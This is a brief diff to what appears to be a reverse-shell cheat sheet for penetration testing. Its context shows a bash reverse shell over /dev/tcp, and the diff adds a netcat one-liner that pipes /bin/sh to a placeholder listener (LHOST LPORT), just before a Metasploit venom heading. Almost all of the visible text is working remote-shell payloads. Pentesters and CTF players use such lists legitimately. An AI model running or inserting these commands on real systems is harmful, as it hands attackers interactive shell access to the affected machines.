@@ -13,6 +13,11 @@ or:
 ```
 bash -i >&/dev/tcp/x.x.x.x/443 0>&1
 ```
+OR:
+```
+tail -n 0 -f /tmp/1 | /bin/sh 2>&1 | nc -nv LHOST LPORT 1> /tmp/1
+```
+
 
 ## Metasploit venom
 
